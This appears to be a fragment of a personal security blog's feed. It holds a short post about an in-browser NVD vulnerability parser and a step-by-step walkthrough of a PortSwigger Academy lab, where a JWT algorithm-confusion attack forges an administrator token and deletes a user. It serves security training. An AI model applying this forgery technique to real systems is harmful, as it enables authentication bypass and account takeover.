+now, for your particular setup, it may prove substantially easier than any of the
+strategies explained here.&lt;/p&gt;</content><author><name></name></author><summary type="html">Scope and Purpose</summary></entry><entry><title type="html">Daily Nist Nvd Parser</title><link href="http://localhost:4000/2022/06/19/daily-nist-nvd-parser.html" rel="alternate" type="text/html" title="Daily Nist Nvd Parser" /><published>2022-06-19T00:00:00-04:00</published><updated>2022-06-19T00:00:00-04:00</updated><id>http://localhost:4000/2022/06/19/daily-nist-nvd-parser</id><content type="html" xml:base="http://localhost:4000/2022/06/19/daily-nist-nvd-parser.html">&lt;h1 id=&quot;daily-nist-nvd-parser&quot;&gt;Daily NIST NVD Parser&lt;/h1&gt;
+
+&lt;p&gt;Today, I wrote a very simple NVD parser, written entirely in Javascript. Its purpose is to provide a brief overview of vulnerabilities that were identified between the previous day and the time you load the page. Everything runs entirely in the browser. Only information from the NVD feed is written to the DOM, and that data is sanitized through HTML-encoding, which is written into the global &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt; prototype.&lt;/p&gt;
+
+&lt;p&gt;You can &lt;a href=&quot;https://halcyondream.github.io/nvdparser&quot;&gt;try the parser&lt;/a&gt; yourself, or &lt;a href=&quot;https://github.com/halcyondream/halcyondream.github.io/blob/main/nvdparser/nvdparser.js&quot;&gt;read the source code&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;considerations&quot;&gt;Considerations&lt;/h1&gt;
+
+&lt;p&gt;HTML-encoding occurs when any data is written from the API to the DOM. An attacker should not be able to inject unsafe characters (for example, to cause a cross-site scripting attack).&lt;/p&gt;
+
+&lt;p&gt;Of course, there may exist a possibility for an attacker to exploit the use of string concatenation to create the URL. Likewise, although HTML-encoding does occur, the means by which it encodes data is pretty simple. It is possible that an implementation flaw in the encoder method could cause this encoding to fail (for example, triggering a ReDoS in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.match&lt;/code&gt; logic).&lt;/p&gt;
+
+&lt;p&gt;Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fetch&lt;/code&gt; occurs in the browser itself. A user who makes too many requests to the database (for example, by refreshing the page too many times) may prevent themselves from retrieving the API data, thus causing a kind of self-DoS.&lt;/p&gt;</content><author><name></name></author><summary type="html">Daily NIST NVD Parser</summary></entry><entry><title type="html">Hacking JWTs with Portswigger Academy</title><link href="http://localhost:4000/2022/06/15/hacking-jwts-with-portswigger-academy.html" rel="alternate" type="text/html" title="Hacking JWTs with Portswigger Academy" /><published>2022-06-15T00:00:00-04:00</published><updated>2022-06-15T00:00:00-04:00</updated><id>http://localhost:4000/2022/06/15/hacking-jwts-with-portswigger-academy</id><content type="html" xml:base="http://localhost:4000/2022/06/15/hacking-jwts-with-portswigger-academy.html">&lt;h1 id=&quot;hacking-jwts-with-portswigger-academy&quot;&gt;Hacking JWTs with Portswigger Academy&lt;/h1&gt;
+
+&lt;p&gt;This past weekend, I participated in the 2022 Tenable CTF. A few of the web-application challenges involved some form of JWT hacking. Portswigger Academy has recently introduced this as a new set of challenges.&lt;/p&gt;
+
+&lt;p&gt;Most of them are best accomplished by using the JWT Editor plugin for BurpSuite. However, due to some of the plugins’ shortcomings, the simple editor on jwt.io was necessary to complete at least one challenge.&lt;/p&gt;
+
+&lt;p&gt;At the time of writing, the site has not published any of their own walkthroughs. So, for anyone interested in getting started, here is a courtesy walkthrough from the advanced section: &lt;a href=&quot;https://portswigger.net/web-security/jwt/algorithm-confusion&quot;&gt;algorithm-confusion attacks&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Portswigger Academy defines an algorithm-confusion attack as:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Algorithm confusion attacks (also known as key confusion attacks) occur  when an attacker is able to force the server to verify the signature of a JSON web token (&lt;a href=&quot;https://portswigger.net/web-security/jwt&quot;&gt;JWT&lt;/a&gt;) using a different algorithm than is intended by the website’s developers.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The root cause: the algorithm is not handled correctly. Attackers can forge a valid JWT which contains any header or payload value. They do so without needing to know the server’s secret signing-key.&lt;/p&gt;
+
+&lt;p&gt;This walkthrough will cover the lab titled, &lt;a href=&quot;https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion&quot;&gt;“JWT authentication bypass via algorithm confusion”&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Before starting, this walkthrough assumes that you have a basic understanding of JWTs and JWKs. If not, try to complete the previous walkthroughs. They will enrich your understanding of the attack, and can help you perform different JWT hacks on your own.&lt;/p&gt;
+
+&lt;h2 id=&quot;walkthrough-with-an-exposed-key&quot;&gt;Walkthrough with an exposed key&lt;/h2&gt;
+
+&lt;p&gt;The goal is to log in as the &lt;strong&gt;Administrator&lt;/strong&gt; and delete the account for &lt;strong&gt;carlos&lt;/strong&gt;. (Sorry, Carlos.) We will leverage an exposed key to sign a JWT. We will also employ algorithm confusion to authenticate the token using the &lt;strong&gt;HS256&lt;/strong&gt; algorithm.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Note: One of the previous labs explains JWKs and lets you exploit an exposed JWK. It may help to complete that exercise before attempting this one.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;First, open Burp Suite, and use the in-built browser to open the lab URL. (You can also use your own browser with the Burp Suite proxy, but this guide will use the in-built browser.)&lt;/p&gt;
+
+&lt;p&gt;Look for an endpoint that contains a potentially-exposed key. Due to the way Portswigger writes their guides, we can infer it is at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jwks.json&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/.well-known/jwks.json&lt;/code&gt;. Indeed, the former endpoint contains the keys for this exercise.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615194025895.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Copy the key, which is all the data within the innermost brackets; this is the JWK.&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;kty&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RSA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AQAB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;use&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;kid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5ad6d549-2a6c-4d3b-8480-5852ea6d2484&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;alg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RS256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3_1tAbFE7xCdfiBSEA9ATv_WPDQT5Zm5nB4bStj17GGHpPdzc-bqdb9WbiomRo7EQxk7UbcJDropboawhhPF-iokNNHYu3xIs7VrfdyBqwIOvo9ggnK72Ull1yF4lsRJI1ekPSgLoa4-gqgYjXKDGkZIIZj6CfPkIObMFuHeOR7u6zjb3NDmtFDjdlNQS76rpCYdJl8q9C_UWB1imolc3HasydZglc5EkfQOdsIc7a9mdp0gDIocCn52R5ghmMkkaBg8o7bcnQHdO3iq-z7yRMy0VFmh4JKuNmTRZ_i4P2YlghxynrGWV4U2BsOT0FKGK5p2o582J-iQ5wXhpaBPPQ&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We want to transform this from JWK to &lt;strong&gt;PEM&lt;/strong&gt; format. There are some online tools (and a NodeJS package) that can perform this conversion. For simplicity, we will use the Burp Suite addon.&lt;/p&gt;
+
+&lt;p&gt;Open the &lt;strong&gt;JWT Editor Keys&lt;/strong&gt; tab. Select &lt;strong&gt;New RSA Key&lt;/strong&gt;. Then, paste the key we extracted previously.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615194936902.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, select the &lt;strong&gt;PEM&lt;/strong&gt; radio button. The JWK appears as a PEM public key. Copy the &lt;strong&gt;key&lt;/strong&gt; section only (&lt;em&gt;not&lt;/em&gt; the Key ID).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615195037931.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, open Burp Suite’s &lt;strong&gt;Decoder&lt;/strong&gt; tab. Paste the key in the first text-entry box. From the &lt;strong&gt;Encode As …&lt;/strong&gt; dropdown, select &lt;strong&gt;Base64&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;The base64-encoded representation of the key appears in the bottom text box. Copy this encoded value.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615195347091.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This produces a rather long base64-encoded value:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzLzF0QWJGRTd4Q2RmaUJTRUE5QQpUdi9XUERRVDVabTVuQjRiU3RqMTdHR0hwUGR6YyticWRiOVdiaW9tUm83RVF4azdVYmNKRHJvcGJvYXdoaFBGCitpb2tOTkhZdTN4SXM3VnJmZHlCcXdJT3ZvOWdnbks3MlVsbDF5RjRsc1JKSTFla1BTZ0xvYTQrZ3FnWWpYS0QKR2taSUlaajZDZlBrSU9iTUZ1SGVPUjd1NnpqYjNORG10RkRqZGxOUVM3NnJwQ1lkSmw4cTlDL1VXQjFpbW9sYwozSGFzeWRaZ2xjNUVrZlFPZHNJYzdhOW1kcDBnRElvY0NuNTJSNWdobU1ra2FCZzhvN2JjblFIZE8zaXErejd5ClJNeTBWRm1oNEpLdU5tVFJaL2k0UDJZbGdoeHluckdXVjRVMkJzT1QwRktHSzVwMm81ODJKK2lRNXdYaHBhQlAKUFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Note: You can decode this on your own to see the original public key in plaintext.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Return to the &lt;strong&gt;JWT Editor Keys&lt;/strong&gt; tab. Select &lt;strong&gt;New Symmetric Key&lt;/strong&gt;. Select &lt;strong&gt;Generate&lt;/strong&gt; to create a new symmetric key.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615195734130.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Replace the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k&lt;/code&gt; with the base64-encoded version of the public key we created in the decoder. This will allow us to sign the JWT using the exposed public key.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615195648222.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our attacker-controlled &lt;em&gt;Symmetric&lt;/em&gt; key is:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    &quot;kty&quot;: &quot;oct&quot;,
+    &quot;kid&quot;: &quot;672c5760-8eca-4912-8161-8e7591b830cd&quot;,
+    &quot;k&quot;: &quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzLzF0QWJGRTd4Q2RmaUJTRUE5QQpUdi9XUERRVDVabTVuQjRiU3RqMTdHR0hwUGR6YyticWRiOVdiaW9tUm83RVF4azdVYmNKRHJvcGJvYXdoaFBGCitpb2tOTkhZdTN4SXM3VnJmZHlCcXdJT3ZvOWdnbks3MlVsbDF5RjRsc1JKSTFla1BTZ0xvYTQrZ3FnWWpYS0QKR2taSUlaajZDZlBrSU9iTUZ1SGVPUjd1NnpqYjNORG10RkRqZGxOUVM3NnJwQ1lkSmw4cTlDL1VXQjFpbW9sYwozSGFzeWRaZ2xjNUVrZlFPZHNJYzdhOW1kcDBnRElvY0NuNTJSNWdobU1ra2FCZzhvN2JjblFIZE8zaXErejd5ClJNeTBWRm1oNEpLdU5tVFJaL2k0UDJZbGdoeHluckdXVjRVMkJzT1QwRktHSzVwMm81ODJKK2lRNXdYaHBhQlAKUFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Select &lt;strong&gt;OK&lt;/strong&gt; to save it.&lt;/p&gt;
+
+&lt;p&gt;Now, sign in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wiener:peter&lt;/code&gt; to generate a valid JWT. A successful login will redirect you to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/my-account&lt;/code&gt; endpoint.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615200219977.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Open the request-response in the &lt;strong&gt;Proxy&lt;/strong&gt; &amp;gt; &lt;strong&gt;HTTP History&lt;/strong&gt; tab. Observe the fresh JWT in the &lt;strong&gt;Request&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615200420952.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The value:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eyJraWQiOiIxMjBiNTYyNC0zZjRlLTRhN2QtOTJlNy0xYjg2ZGFiYTNhZmQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTM0MTMwOH0.NHOZbV5JKPnQoEor5UOPGWHHJ7kHopT8GAbq0fGtjJwXbShRdCC9HbOzIp_RdpPiDVCf4v2uHLBgNzioQhGzP1Qu-zQY7PpahKMGUa8PDk08EGlyL5LZl7bUOz8mhKaXEvwgjkUg3IwzbRHgBD4E0n5n_n6-HYGzkJLqQ53RMVrzpR0fv8FXAcus_klmpJn7_7JvoyUES5apV8WbtwZ2KGU3EJSmlKw1RxHgyFRS3YBwbcQNR00AzuXAoztq05nRJE0NgCWiYrpLjAbsgIRgRQFwspbPaIYqaBPW7nXqdVLh1tAVkrV6H4urVVUdiIXYhio9nNIEmOxCTA4WduMvLA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, open the &lt;strong&gt;JSON Web Token&lt;/strong&gt; tab. This view will decode the token and reveal its header, payload, and signature sections.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615200531795.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Send this to the Repeater so we can modify the request.&lt;/p&gt;
+
+&lt;p&gt;To gain administrative privileges (and remove poor Carlos from the system), we will need to use this panel to make a few changes.&lt;/p&gt;
+
+&lt;p&gt;In the &lt;em&gt;Header&lt;/em&gt;, change the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alg&lt;/code&gt; from RS256 to &lt;strong&gt;HS256&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;In the &lt;em&gt;Payload&lt;/em&gt;, change &lt;strong&gt;sub&lt;/strong&gt; (the “subject” or user) from wiener to &lt;strong&gt;administrator&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Finally, in the &lt;em&gt;Signature&lt;/em&gt; area, select &lt;strong&gt;Sign&lt;/strong&gt;. Expand the &lt;strong&gt;Signing Key&lt;/strong&gt; dropdown, and choose the symmetric key we made earlier. Also ensure the &lt;em&gt;Signing Algorithm&lt;/em&gt; is set to &lt;strong&gt;HS256&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615200925509.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Select &lt;strong&gt;OK&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you did everything correctly, the new JWT will look like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615201003315.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Select &lt;strong&gt;Send&lt;/strong&gt;. If you configured the JWT correctly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/my-account&lt;/code&gt; page loads with the Administrator’s information.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615201709885.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To complete the lab, we need to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; endpoint (per the instructions), point the GET header to this location. Then, select &lt;strong&gt;Send&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615201749814.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you did everything correctly, this will return a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;200&lt;/code&gt;, and show the administrator control panel. Scroll down to find the endpoint path to delete Carlos. (I don’t know what he did.)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615201834258.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Modify the Request one last time to point to this URL. If successful, it will yield a 302 that points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; endpoint.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615202121475.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Right-click the request or response. Select &lt;strong&gt;Open Response in Browser&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615202213316.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, copy the URL, and paste it in the browser. The “success” banner will load as Carlos is eliminated from the system.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-15/image-20220615202334166.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;reflections-on-the-lab&quot;&gt;Reflections on the lab&lt;/h2&gt;
+
+&lt;p&gt;In the real world, we will need some information before we can exploit an application. Values like the administrator’s actual user name or user ID can be guessed, but this may trigger a security alert on the victim’s page, or lockout due to a WAF. Likely, an attacker will try to employ some kind of OSINT or social engineering to get this information.&lt;/p&gt;
+
+&lt;p&gt;Next, the target algorithm may not confuse the application so easily. This will require trial-and-error and may invoke the caveats mentioned in the previous paragraph.&lt;/p&gt;
+
+&lt;p&gt;In addition, the lab ignores any kind of multifactor authentication. In a robust security system, the administrator would likely re-enter their password, or perhaps trigger a challenge-response prompt (a 2FA code or push notification) before a state-altering action, like deleting Carlos, will complete.&lt;/p&gt;
+
+&lt;p&gt;Finally, this lab worked because we had access to the public JWK (conveniently listening on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jwks.json&lt;/code&gt;). In a real-world attack, the adversary may not know this value upfront. One workaround is to use tools and compare two known JWTs; this is covered in &lt;a href=&quot;https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key&quot;&gt;the next lab in the series&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">Hacking JWTs with Portswigger Academy</summary></entry></feed>
